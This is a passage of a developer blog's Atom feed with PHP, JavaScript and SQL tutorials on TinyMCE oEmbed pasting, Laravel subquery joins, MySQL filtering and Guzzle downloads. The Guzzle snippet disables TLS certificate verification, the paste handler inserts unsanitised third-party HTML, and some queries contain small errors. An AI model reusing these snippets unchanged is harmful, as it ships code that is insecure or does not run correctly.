class="string">&#x27;author_name&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;authorName, //The resource author</span><br><span class="line">            <span class="string">&#x27;author_url&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;authorUrl, //The author url</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;provider_name&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;providerName, //The provider name of the <span class="title function_ invoke__">page</span> (Youtube, Twitter, Instagram, etc)</span><br><span class="line">            <span class="string">&#x27;provider_url&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;providerUrl, //The provider url</span><br><span class="line">            <span class="string">&#x27;provider_icons&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;providerIcons, //All provider icons found in the page</span><br><span class="line">            <span class="string">&#x27;provider_icon&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;providerIcon, //The icon choosen <span class="keyword">as</span> main icon</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;published_date&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;publishedDate, //The published date of the resource</span><br><span class="line">            <span class="string">&#x27;license&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;license, //The license url of the resource</span><br><span class="line">            <span class="string">&#x27;linked_data&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;linkedData, //The linked-data <span class="title function_ invoke__">info</span> (<span class="attr">http</span>://json-ld.org/)</span><br><span class="line">            <span class="string">&#x27;feeds&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;feeds, //The RSS/Atom feeds</span><br><span class="line">        ];</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\Embed\Exceptions\InvalidUrlException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%s: %s&#x27;</span>, <span class="title function_ invoke__">get_class</span>(<span class="variable">$e</span>), <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>())</span><br><span class="line">        ], <span class="number">404</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%s: %s&#x27;</span>, <span class="title function_ invoke__">get_class</span>(<span class="variable">$e</span>), <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>())</span><br><span class="line">        ], <span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now, you can test your endpoint</p><p>GET <a href="https://yoursite.com/oembed?url=https://www.youtube.com/watch?v=G5seUqK1EeE">https://yoursite.com/oembed?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DG5seUqK1EeE</a></p><p>The most important data is the <strong>code</strong>.</p><h3 id="3-Show-the-3rd-party-content-into-TinyMCE"><a href="#3-Show-the-3rd-party-content-into-TinyMCE" class="headerlink" title="3. Show the 3rd party content into TinyMCE"></a>3. Show the 3rd party content into TinyMCE</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isValidURL</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a  = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    a.<span class="property">href</span> = str;</span><br><span class="line">    <span class="keyword">return</span> (a.<span class="property">host</span> &amp;&amp; a.<span class="property">host</span> != <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">host</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tinymce.<span class="title function_">init</span>(&#123;</span><br><span class="line">    <span class="comment">// remember to add a &#x27;paste&#x27; plugin</span></span><br><span class="line">    <span class="attr">plugins</span>: <span class="string">&#x27;... ... ... paste&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make the embed content non-editable</span></span><br><span class="line">    <span class="attr">noneditable_noneditable_class</span>: <span class="string">&#x27;embed-content&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here we interrupt the paste process</span></span><br><span class="line">    <span class="attr">paste_preprocess</span>: <span class="keyword">function</span>(<span class="params">plugin, args</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> input = args.<span class="property">content</span>.<span class="title function_">trim</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// skip if not a valid URL</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">isValidURL</span>(input)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&#x27;/oembed&#x27;</span>,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">            <span class="attr">async</span>: <span class="literal">false</span>, <span class="comment">// set the async to false, because we want to replace the original content with the embed code</span></span><br><span class="line">            <span class="attr">data</span>: &#123;</span><br><span class="line">                <span class="attr">url</span>: input</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data, textStatus, jqXHR</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data.<span class="property">code</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// wrap the embed code with a div, to prevent it to be editable</span></span><br><span class="line">                args.<span class="property">content</span> = <span class="string">&#x27;&lt;div class=&quot;embed-content&quot;&gt;&#x27;</span> + data.<span class="property">code</span> + <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">jqXHR, textStatus, errorThrown</span>) &#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">complete</span>: <span class="keyword">function</span> (<span class="params">jqXHR, textStatus</span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Now, let’s try to paste a YouTube link to TinyMCE editor. It should works 😉</p><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://stackoverflow.com/questions/5717093/check-if-a-javascript-string-is-a-url/34695026#34695026">Check if a JavaScript string is a URL</a></li><li><a href="https://www.tiny.cloud/docs/plugins/noneditable/">TinyMCE - Noneditable plugin</a></li><li><a href="https://www.tiny.cloud/docs/plugins/paste/">TinyMCE - Paste plugin</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://oembed.com/&quot;&gt;oEmbed&lt;/a&gt; is a kind of standard to retrieve 3rd party site info.&lt;/p&gt;
&lt;p&gt;Example, in rich editor like &lt;a</summary>
        
      
    
    
    
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="tinymce" scheme="http://jslim.net/tags/tinymce/"/>
    
    <category term="oembed" scheme="http://jslim.net/tags/oembed/"/>
    
  </entry>
  
  <entry>
    <title>Laravel Eloquent join with subquery</title>
    <link href="http://jslim.net/blog/2019/02/19/Laravel-Eloquent-join-with-subquery/"/>
    <id>http://jslim.net/blog/2019/02/19/Laravel-Eloquent-join-with-subquery/</id>
    <published>2019-02-19T16:03:52.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Let’s take the query from <a href="/blog/2019/02/19/MySQL-a-trick-to-filter-multi-values-column/">this post</a> as example</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> books.id <span class="keyword">AS</span> book_id</span><br><span class="line">  , books.isbn</span><br><span class="line">  , books.title</span><br><span class="line">  , t_borrowers.user_ids</span><br><span class="line"><span class="keyword">FROM</span> books</span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> user_books.book_id</span><br><span class="line">      , CONCAT(<span class="string">&#x27;#&#x27;</span>, GROUP_CONCAT(user_books.user_id SEPARATOR <span class="string">&#x27;#,#&#x27;</span>), <span class="string">&#x27;#&#x27;</span>) <span class="keyword">AS</span> user_ids</span><br><span class="line">    <span class="keyword">FROM</span> user_books</span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span> user_books.book_id</span><br><span class="line">  ) <span class="keyword">AS</span> t_borrowers <span class="keyword">ON</span> t_borrowers.book_id <span class="operator">=</span> books.id</span><br><span class="line"><span class="keyword">WHERE</span> (t_borrowers.user_ids <span class="keyword">LIKE</span> <span class="string">&#x27;%#1#%&#x27;</span> <span class="keyword">OR</span> t_borrowers.user_ids <span class="keyword">LIKE</span> <span class="string">&#x27;%#3#%&#x27;</span>);</span><br></pre></td></tr></table></figure><p>See there’s a sub-select inside? Let’s see how to construct this query in Laravel</p><p><code>\App\Models\Book</code> class map to the table <code>books</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// inner select</span></span><br><span class="line"><span class="variable">$subquery</span> = \DB::<span class="title function_ invoke__">table</span>(<span class="string">&#x27;user_books&#x27;</span>)</span><br><span class="line">    -&gt;<span class="title function_ invoke__">select</span>([</span><br><span class="line">        <span class="string">&#x27;user_books.book_id&#x27;</span>,</span><br><span class="line">        \DB::<span class="title function_ invoke__">raw</span>(<span class="string">&#x27;CONCAT(\&#x27;#\&#x27;, GROUP_CONCAT(user_books.user_id SEPARATOR \&#x27;#,#\&#x27;), \&#x27;#\&#x27;) AS user_ids&#x27;</span>),</span><br><span class="line">    ])-&gt;<span class="title function_ invoke__">groupBy</span>(<span class="string">&#x27;user_books.book_id&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="title class_">\App\Models\Book</span>::<span class="title function_ invoke__">select</span>([</span><br><span class="line">    \DB::<span class="title function_ invoke__">raw</span>(<span class="string">&#x27;books.id AS book_id&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;books.isbn&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;books.title&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t_borrowers.user_ids&#x27;</span>,</span><br><span class="line">])</span><br><span class="line">    -&gt;<span class="title function_ invoke__">leftJoinSub</span>(<span class="variable">$subquery</span>, <span class="string">&#x27;t_borrowers&#x27;</span>, function (<span class="variable">$join</span>) &#123;</span><br><span class="line">        <span class="variable">$join</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;t_borrowers.book_id&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;books.id&#x27;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    -&gt;<span class="title function_ invoke__">where</span>(function (<span class="variable">$q</span>) &#123;</span><br><span class="line">        <span class="variable">$q</span>-&gt;<span class="title function_ invoke__">orWhere</span>(<span class="string">&#x27;t_borrowers.user_ids&#x27;</span>, <span class="string">&#x27;LIKE&#x27;</span>, <span class="string">&#x27;#&#x27;</span> . <span class="number">1</span> . <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">orWhere</span>(<span class="string">&#x27;t_borrowers.user_ids&#x27;</span>, <span class="string">&#x27;LIKE&#x27;</span>, <span class="string">&#x27;#&#x27;</span> . <span class="number">3</span> . <span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>By using the <code>leftJoinSub</code> to construct the query</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Let’s take the query from &lt;a href=&quot;/blog/2019/02/19/MySQL-a-trick-to-filter-multi-values-column/&quot;&gt;this post&lt;/a&gt; as example&lt;/p&gt;
&lt;figure</summary>
        
      
    
    
    
    
    <category term="mysql" scheme="http://jslim.net/tags/mysql/"/>
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="laravel5" scheme="http://jslim.net/tags/laravel5/"/>
    
    <category term="eloquent" scheme="http://jslim.net/tags/eloquent/"/>
    
    <category term="subquery" scheme="http://jslim.net/tags/subquery/"/>
    
  </entry>
  
  <entry>
    <title>MySQL - a trick to filter multi-values column</title>
    <link href="http://jslim.net/blog/2019/02/19/MySQL-a-trick-to-filter-multi-values-column/"/>
    <id>http://jslim.net/blog/2019/02/19/MySQL-a-trick-to-filter-multi-values-column/</id>
    <published>2019-02-19T14:22:19.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>For certain reason, sometime we want to filter the data in a multi-values column.</p><p>e.g.</p><p><code>books</code></p><table><thead><tr><th>id</th><th>isbn</th><th>title</th></tr></thead><tbody><tr><td>1</td><td>8-230185-1321</td><td>The Secret C++</td></tr><tr><td>2</td><td>23801-23815-9</td><td>MySQL for tummy</td></tr><tr><td>3</td><td>78-923722-223</td><td>Programmer Bible</td></tr></tbody></table><p><code>users</code></p><table><thead><tr><th>id</th><th>username</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>js</td><td>JS</td></tr><tr><td>2</td><td>foo</td><td>Mr Foo</td></tr><tr><td>3</td><td>bar</td><td>Ms Bar</td></tr></tbody></table><p><code>user_books</code></p><table><thead><tr><th>book_id</th><th>user_id</th><th>date</th></tr></thead><tbody><tr><td>2</td><td>1</td><td>2019-01-03 12:38:29</td></tr><tr><td>1</td><td>3</td><td>2019-01-08 18:08:09</td></tr><tr><td>3</td><td>2</td><td>2019-01-13 22:37:12</td></tr></tbody></table><p>Let say now want to filter the books has borrowed by user ID 1 &amp; 3</p><p>If normal select</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> books.id <span class="keyword">AS</span> book_id</span><br><span class="line">  , books.isbn</span><br><span class="line">  , books.title</span><br><span class="line">  , t_borrowers.user_ids</span><br><span class="line"><span class="keyword">FROM</span> books</span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> user_books <span class="keyword">ON</span> user_books.book_id <span class="operator">=</span> books.id</span><br><span class="line"><span class="keyword">WHERE</span> user_books.user_id <span class="keyword">IN</span> (<span class="number">1</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>Filter in single column</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> books.id <span class="keyword">AS</span> book_id</span><br><span class="line">  , books.isbn</span><br><span class="line">  , books.title</span><br><span class="line">  , t_borrowers.user_ids</span><br><span class="line"><span class="keyword">FROM</span> books</span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> user_books.book_id</span><br><span class="line">      , CONCAT(<span class="string">&#x27;#&#x27;</span>, GROUP_CONCAT(user_books.user_id SEPARATOR <span class="string">&#x27;#,#&#x27;</span>), <span class="string">&#x27;#&#x27;</span>) <span class="keyword">AS</span> user_ids</span><br><span class="line">    <span class="keyword">FROM</span> user_books</span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span> user_books.book_id</span><br><span class="line">  ) <span class="keyword">AS</span> t_borrowers <span class="keyword">ON</span> t_borrowers.book_id <span class="operator">=</span> books.id</span><br><span class="line"><span class="keyword">WHERE</span> (t_borrowers.user_ids <span class="keyword">LIKE</span> <span class="string">&#x27;%#1#%&#x27;</span> <span class="keyword">OR</span> t_borrowers.user_ids <span class="keyword">LIKE</span> <span class="string">&#x27;%#3#%&#x27;</span>);</span><br></pre></td></tr></table></figure><p>The trick is, to add a symbol <em>(here I use #)</em> to wrap the ID when concat the values,<br>then in bottom there use LIKE &amp; OR to filter, remember to wrap around the ID when filter.</p><p>This example may not exactly shows up the purpose of using sub-query &amp; wrap the value with symbol.<br>It look complicated &amp; uncessary, but, in some cases may need to do in this way.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;For certain reason, sometime we want to filter the data in a multi-values</summary>
        
      
    
    
    
    
    <category term="mysql" scheme="http://jslim.net/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>Guzzle HTTP client cannot download file with special character</title>
    <link href="http://jslim.net/blog/2019/01/11/Guzzle-HTTP-client-cannot-download-file-with-special-character/"/>
    <id>http://jslim.net/blog/2019/01/11/Guzzle-HTTP-client-cannot-download-file-with-special-character/</id>
    <published>2019-01-11T00:16:09.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I’m using <a href="http://docs.guzzlephp.org/en/stable/">Guzzle</a> to download image file, the code as below</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$normal_url</span> = <span class="string">&#x27;http://example.com/path/to/image.png&#x27;</span>;</span><br><span class="line"><span class="variable">$special_char_url</span> = <span class="string">&#x27;http://example.com/path/to/ครีมอาบน้ำ.jpg&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="string">&#x27;/tmp/&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">\GuzzleHttp\Client</span>();</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$url</span>, [</span><br><span class="line">        <span class="string">&#x27;verify&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;sink&#x27;</span> =&gt; <span class="variable">$output</span>,</span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">download</span>(<span class="variable">$normal_url</span>); <span class="comment">// this 1 works</span></span><br><span class="line"><span class="title function_ invoke__">download</span>(<span class="variable">$special_char_url</span>); <span class="comment">// this throw 404 error</span></span><br></pre></td></tr></table></figure><p>The thai characters file name throw error</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GuzzleHttp\Exception\ClientException: Client<span class="built_in"> error</span>: `GET http://example.com/path/<span class="keyword">to</span>/<span class="meta">%E0</span><span class="meta">%B8_</span><span class="meta">%E0</span><span class="meta">%B8</span><span class="meta">%A3</span><span class="meta">%E0</span><span class="meta">%B8</span><span class="meta">%B5</span><span class="meta">%E0</span><span class="meta">%B8</span><span class="meta">%A1</span><span class="meta">%E0</span><span class="meta">%B8</span><span class="meta">%AD</span><span class="meta">%E0</span><span class="meta">%B8</span><span class="meta">%B2</span><span class="meta">%E0</span><span class="meta">%B8_</span><span class="meta">%E0</span><span class="meta">%B8_</span><span class="meta">%E0</span><span class="meta">%B9_</span><span class="meta">%E0</span><span class="meta">%B8</span><span class="meta">%B3</span>.jpg` resulted <span class="keyword">in</span> a `<span class="number">404</span> Not Found` response:</span><br></pre></td></tr></table></figure><p>The URL encoding is actually wrong, because I paste the URL to Chrome address bar, and then copy again, it gives</p><p><a href="http://example.com/path/to/%E0%B8%84%E0%B8%A3%E0%B8%B5%E0%B8%A1%E0%B8%AD%E0%B8%B2%E0%B8%9A%E0%B8%99%E0%B9%89%E0%B8%B3.jpg">http://example.com/path/to/%E0%B8%84%E0%B8%A3%E0%B8%B5%E0%B8%A1%E0%B8%AD%E0%B8%B2%E0%B8%9A%E0%B8%99%E0%B9%89%E0%B8%B3.jpg</a></p><p>The Guzzle encoding has problem, so how I solve this is, use php curl, the raw php code…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="string">&#x27;/tmp/&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$output</span>, <span class="string">&#x27;w+&#x27;</span>);</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_TIMEOUT, <span class="number">50</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FILE, <span class="variable">$fp</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://stackoverflow.com/questions/6409462/downloading-a-large-file-using-curl/6409531#6409531">Get the code from here</a></p><p>Simple &amp; working solution :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’m using &lt;a href=&quot;http://docs.guzzlephp.org/en/stable/&quot;&gt;Guzzle&lt;/a&gt; to download image file, the code as below&lt;/p&gt;
&lt;figure</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="http" scheme="http://jslim.net/tags/http/"/>
    
    <category term="guzzle" scheme="http://jslim.net/tags/guzzle/"/>
    
  </entry>
  
  <entry>
    <title>TinyMCE insert js/css into iFrame head element</title>
    <link href="http://jslim.net/blog/2018/10/17/TinyMCE-insert-js-css-into-iFrame-head-element/"/>
    <id>http://jslim.net/blog/2018/10/17/TinyMCE-insert-js-css-into-iFrame-head-element/</id>
    <published>2018-10-17T14:47:56.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>TinyMCE is an iFrame element with full HTML content.</p><p>Sometime we would like to add in Bootstrap &amp; jQuery or any plugins into it.<br>Let’s see how we achieve it.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tinymce.<span class="title function_">init</span>(&#123;</span><br><span class="line">    <span class="attr">selector</span>: <span class="string">&#x27;.tinymce&#x27;</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Above is the basic setup. To add in Bootstrap stylesheet, just add in <code>content_css</code> option</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">content_css</span>: [</span><br><span class="line">    <span class="string">&#x27;https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/css/custom-mce.css&#x27;</span>, <span class="comment">// if you want to add in custom styles</span></span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>What about JavaScript? We can make use of <code>init_instance_callback</code> option</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">init_instance_callback</span>: <span class="keyword">function</span>(<span class="params">editor</span>) &#123;</span><br><span class="line">    <span class="comment">// get the head element</span></span><br><span class="line">    <span class="keyword">let</span> head = editor.<span class="property">dom</span>.<span class="title function_">select</span>(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// just add in whatever plugins needed</span></span><br><span class="line">    <span class="title function_">addScript</span>(<span class="string">&#x27;https://code.jquery.com/jquery-3.3.1.min.js&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this is needed, without the delay, it will show jQuery is not defined</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">addScript</span>(<span class="string">&#x27;https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js&#x27;</span>);</span><br><span class="line">        <span class="title function_">addScript</span>(<span class="string">&#x27;/path/to/your/script.js&#x27;</span>);</span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// helper function</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addScript</span> (scriptUrl) &#123;</span><br><span class="line">        editor.<span class="property">dom</span>.<span class="title function_">add</span>(</span><br><span class="line">            head,</span><br><span class="line">            <span class="string">&#x27;script&#x27;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">src</span>: scriptUrl,</span><br><span class="line">                <span class="attr">type</span>: <span class="string">&#x27;text/javascript&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>References:</p><ul><li><a href="https://www.tiny.cloud/docs/configure/content-appearance/#content_css">TinyMCE - Content Appearance</a></li><li><a href="http://archive.tinymce.com/forum/viewtopic.php?pid=115216#p115216">Access head tag and add html</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;TinyMCE is an iFrame element with full HTML content.&lt;/p&gt;
&lt;p&gt;Sometime we would like to add in Bootstrap &amp;amp; jQuery or any plugins into</summary>
        
      
    
    
    
    
    <category term="js" scheme="http://jslim.net/tags/js/"/>
    
    <category term="tinymce" scheme="http://jslim.net/tags/tinymce/"/>
    
  </entry>
  
  <entry>
